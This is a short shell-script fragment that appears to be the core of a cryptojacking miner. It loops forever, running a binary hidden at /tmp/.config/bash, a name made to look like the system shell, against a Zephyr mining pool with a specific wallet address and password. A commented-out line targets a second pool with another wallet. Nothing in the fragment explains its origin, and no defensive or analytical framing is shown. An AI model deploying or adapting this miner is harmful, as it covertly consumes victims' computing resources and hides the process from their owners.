...
while [ 1 ]; do
	#/tmp/.config/bash -a ghostrider --url stratum-na.rplant.xyz:7090 --user STeHt4JoHHWRuazNWkeUEt2jufQapdbnzB.2099i
 	...
 	/tmp/.config/bash -a randomx --url de.zephyr.herominers.com:1123 --user ZEPHsD3Xoh6LBK7daphHmXKp5UNctHqe38FrzmdjNQTaCjkrAoStc3LdgRS8atNxpUJAPbCT3d2a3RMLJYhz5xevgyMHMXdBf4U --pass harvard
	sleep 5
done
